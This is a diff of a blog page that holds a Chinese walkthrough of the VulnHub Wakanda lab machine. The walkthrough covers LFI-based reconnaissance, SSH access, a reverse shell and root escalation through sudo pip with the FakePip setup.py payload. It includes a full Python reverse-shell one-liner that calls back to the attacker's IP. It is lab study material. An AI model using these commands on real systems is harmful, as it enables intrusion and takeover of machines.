@@ -232,19 +232,15 @@
                     </span>
 					
                 </div>
-				
             </div>
             <hr>
-			
             <div class="card-content article-card-content">
-				
+			<ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#对wakanda靶机的渗透之旅"><span class="post-toc-text">-对wakanda靶机的渗透之旅</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x00-渗透过程"><span class="post-toc-text">0x00 渗透过程</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#1-对靶机的信息收集"><span class="post-toc-text">1.对靶机的信息收集</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#2-开始渗透靶机"><span class="post-toc-text">2.开始渗透靶机</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#3-攻破root"><span class="post-toc-text">3.攻破root</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x01-小知识"><span class="post-toc-text">0x01 小知识</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#nmap-plus"><span class="post-toc-text">nmap plus</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#python-反弹shell-amp-pip-get-shell"><span class="post-toc-text">python 反弹shell &amp; pip get shell</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#php-filter-and-input-–LFI本地文件包含漏洞"><span class="post-toc-text">php filter and input –LFI本地文件包含漏洞</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#msfvenom-p-生成shell"><span class="post-toc-text">msfvenom -p   生成shell</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#linux-中的一些命令与特性"><span class="post-toc-text">linux 中的一些命令与特性</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#0x02-总结"><span class="post-toc-text">0x02 总结</span></a></li></ol></li></ol>
                 <div id="articleContent">
-					<ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#undefined"><span class="post-toc-text">-对wakanda靶机的渗透之旅</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#undefined"><span class="post-toc-text">0x00 渗透过程</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#undefined"><span class="post-toc-text">1.对靶机的信息收集</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#undefined"><span class="post-toc-text">2.开始渗透靶机</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#undefined"><span class="post-toc-text">3.攻破root</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#undefined"><span class="post-toc-text">0x01 小知识</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#undefined"><span class="post-toc-text">nmap plus</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#undefined"><span class="post-toc-text">python 反弹shell &amp; pip get shell</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#undefined"><span class="post-toc-text">php filter and input –LFI本地文件包含漏洞</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#undefined"><span class="post-toc-text">msfvenom -p   生成shell</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#undefined"><span class="post-toc-text">linux 中的一些命令与特性</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#undefined"><span class="post-toc-text">0x02 总结</span></a></li></ol></li></ol>
-
                     <p>[TOC]</p>
-<h1><span id="-对wakanda靶机的渗透之旅">-对wakanda靶机的渗透之旅</span></h1><p>​    从vulhub上下载靶机后，本打算在vm上搭建，后发现ova导入有点问题，故在virtualbox上搭建成功，我们需要获得flag1.txt,flag2.txt,root.txt 三个文件的信息，将攻击机，靶机均设为桥接网卡模式，因为我的kali是在vm里面。</p>
+<h1 id="对wakanda靶机的渗透之旅"><a href="#对wakanda靶机的渗透之旅" class="headerlink" title="-对wakanda靶机的渗透之旅"></a>-对wakanda靶机的渗透之旅</h1><p>​    从vulhub上下载靶机后，本打算在vm上搭建，后发现ova导入有点问题，故在virtualbox上搭建成功，我们需要获得flag1.txt,flag2.txt,root.txt 三个文件的信息，将攻击机，靶机均设为桥接网卡模式，因为我的kali是在vm里面。</p>
 <p>​    靶机下载地址:<a href="https://www.vulnhub.com/entry/wakanda-1,251/" target="_blank" rel="noopener">https://www.vulnhub.com/entry/wakanda-1,251/</a></p>
-<h2><span id="0x00-渗透过程">0x00 渗透过程</span></h2><h3><span id="1对靶机的信息收集">1.对靶机的信息收集</span></h3><p>攻击机：</p>
+<h2 id="0x00-渗透过程"><a href="#0x00-渗透过程" class="headerlink" title="0x00 渗透过程"></a>0x00 渗透过程</h2><h3 id="1-对靶机的信息收集"><a href="#1-对靶机的信息收集" class="headerlink" title="1.对靶机的信息收集"></a>1.对靶机的信息收集</h3><p>攻击机：</p>
 <pre><code>自用kali--IP地址:192.168.1.107
 </code></pre><p>kali netdiscover 启动:</p>
 <p><img src="https://i.loli.net/2018/10/06/5bb89ebe12b5d.png" alt=""></p>
@@ -321,7 +317,7 @@ include($_GET[&#39;lang&#39;].&quot;.php&quot;);
 </code></pre><p>​    oh！get到一个password：Niamey4Ever227!!!</p>
 <p>​    到现在，我们收集到了作者的名称 mamadou，开放在3333端口的ssh服务，然后一个password。</p>
 <hr>
-<h3><span id="2开始渗透靶机">2.开始渗透靶机</span></h3><p>​    二话不说，用ssh试试远程登录靶机：</p>
+<h3 id="2-开始渗透靶机"><a href="#2-开始渗透靶机" class="headerlink" title="2.开始渗透靶机"></a>2.开始渗透靶机</h3><p>​    二话不说，用ssh试试远程登录靶机：</p>
 <pre class=" language-bash"><code class="language-bash"><span class="token function">ssh</span> 192.168.1.108 -l mamadou -p 3333
 </code></pre>
 <p>​    输入Niamey4Ever227!!!作为密码登录，两秒之后，弹出来一个python shell界面？见识短浅见识短浅，试试用python的pty把完全交互式的终端弄出来。</p>
@@ -371,7 +367,7 @@ WantedBy=multi-user.target
 <p>​    果不其然，获得了反弹devops权限的shell，那么cat flag2.txt ==&gt;Flag 2 : d8ce56398c88e1b4d9e5f83e64c79098</p>
 <p>​    那么下一步就是拿下root权限，攻入root目录了。</p>
 <hr>
-<h3><span id="3攻破root">3.攻破root</span></h3><p>​    先看看devops用户权限大概是怎样的, 执行sudo -l命令：</p>
+<h3 id="3-攻破root"><a href="#3-攻破root" class="headerlink" title="3.攻破root"></a>3.攻破root</h3><p>​    先看看devops用户权限大概是怎样的, 执行sudo -l命令：</p>
 <p><img src="https://i.loli.net/2018/10/06/5bb89f44d2154.png" alt=""></p>
 <p>​    然而，只有一个pip命令是可以不需要root权限就能执行的，试试pip install falsk，没问题。</p>
 <p>​    那么怎样才能通过pip来获取root权限呢？这里用到一个github上的开源脚本Fakepip。这个脚本通过在pip重新安装时执行的setup.py文件中插入shellcode，导致其可通过pip反弹root权限的shell给攻击机。项目地址(<a href="https://github.com/0x00-0x00/FakePip.git" target="_blank" rel="noopener">https://github.com/0x00-0x00/FakePip.git</a>)</p>
@@ -412,36 +408,35 @@ setup(name=&#39;FakePip&#39;,
 <p><img src="https://i.loli.net/2018/10/06/5bb89f7108f3e.png" alt=""></p>
 <p>​    萌新的渗透到此暂停emmmm。</p>
 <hr>
-<h2><span id="0x01-小知识">0x01 小知识</span></h2><hr>
-<h3><span id="nmap-plus">nmap plus</span></h3><p>1.特殊扫描方式 ==&gt; nmap -sV/-sP/-sS/sL  其中-sP是用于扫描IP段的</p>
+<h2 id="0x01-小知识"><a href="#0x01-小知识" class="headerlink" title="0x01 小知识"></a>0x01 小知识</h2><hr>
+<h3 id="nmap-plus"><a href="#nmap-plus" class="headerlink" title="nmap plus"></a>nmap plus</h3><p>1.特殊扫描方式 ==&gt; nmap -sV/-sP/-sS/sL  其中-sP是用于扫描IP段的</p>
 <p>2.详细地扫描目标：</p>
 <p>nmap -sV 或者 nmap -p- -A  &lt;目标ip&gt;</p>
 <p>或者超强力的： nmap -sS -sV  -A  -p- &lt;目标ip&gt;</p>
 <hr>
-<h3><span id="python-反弹shell-amp-pip-get-shell">python 反弹shell &amp; pip get shell</span></h3><p>python 反弹 shell:</p>
+<h3 id="python-反弹shell-amp-pip-get-shell"><a href="#python-反弹shell-amp-pip-get-shell" class="headerlink" title="python 反弹shell &amp; pip get shell"></a>python 反弹shell &amp; pip get shell</h3><p>python 反弹 shell:</p>
 <pre class=" language-bash"><code class="language-bash">python -c <span class="token string">"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("</span>192.168.1.107<span class="token string">",7777));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["</span>/bin/sh<span class="token string">","</span>-i<span class="token string">"]);"</span>
 </code></pre>
 <p>python构造完全交互式终端 :</p>
 <pre class=" language-bash"><code class="language-bash"> python -c <span class="token string">"import pty;pty.spawn('/bin/bash')"</span>
 </code></pre>
 <hr>
-<h3><span id="php-filter-and-input-lfi本地文件包含漏洞">php filter and input –LFI本地文件包含漏洞</span></h3><p>参考 <a href="https://blog.csdn.net/qq_35544379/article/details/78230629" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/78230629</a></p>
+<h3 id="php-filter-and-input-–LFI本地文件包含漏洞"><a href="#php-filter-and-input-–LFI本地文件包含漏洞" class="headerlink" title="php filter and input –LFI本地文件包含漏洞"></a>php filter and input –LFI本地文件包含漏洞</h3><p>参考 <a href="https://blog.csdn.net/qq_35544379/article/details/78230629" target="_blank" rel="noopener">https://blog.csdn.net/qq_35544379/article/details/78230629</a></p>
 <p>php://filter,php://input,php://output都是有妙用的哦！</p>
 <hr>
-<h3><span id="msfvenom-p-生成shell">msfvenom -p   生成shell</span></h3><p><img src="https://i.loli.net/2018/10/06/5bb89f84ea8cc.png" alt=""></p>
+<h3 id="msfvenom-p-生成shell"><a href="#msfvenom-p-生成shell" class="headerlink" title="msfvenom -p   生成shell"></a>msfvenom -p   生成shell</h3><p><img src="https://i.loli.net/2018/10/06/5bb89f84ea8cc.png" alt=""></p>
 <p>​    但在渗透过程中发现，不用msfvenom生成的加密shell也能成功反弹，不过还是要养成好习惯，多用用这种神器提高效率并且准确率。</p>
 <p>参考链接 <a href="https://www.cnblogs.com/xishaonian/p/6851475.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/6851475.html</a></p>
 <hr>
-<h3><span id="linux-中的一些命令与特性">linux 中的一些命令与特性</span></h3><p>==&gt; su &amp; sudo </p>
+<h3 id="linux-中的一些命令与特性"><a href="#linux-中的一些命令与特性" class="headerlink" title="linux 中的一些命令与特性"></a>linux 中的一些命令与特性</h3><p>==&gt; su &amp; sudo </p>
 <p>可用于切换用户</p>
 <p>==&gt; lsattr 是 ls的升级版，就如aptitude 与apt相似一样</p>
 <p>==&gt; find / -user root 2&gt;/dev/null 查看用户属性为root的文件</p>
 <p>==&gt;ps -aux 查看所有服务  ==&gt;top 查看进程</p>
 <hr>
-<h2><span id="0x02-总结">0x02 总结</span></h2><p>​    渗透一定一定注意信息收集，思维拓展，然后就是扎实的基础！</p>
+<h2 id="0x02-总结"><a href="#0x02-总结" class="headerlink" title="0x02 总结"></a>0x02 总结</h2><p>​    渗透一定一定注意信息收集，思维拓展，然后就是扎实的基础！</p>
 <p>​    作为萌新，没有那么强的能力，确实有点吃力，但是吃力的过程也在进步，就像不停的被虐的过程，自然自己的等级也在提高，不停地膜大神的文章的同时，自己也会受其影响，我是萌新，各位大佬轻喷哦！</p>
 
-					
                 </div>
                 <hr/>
 			
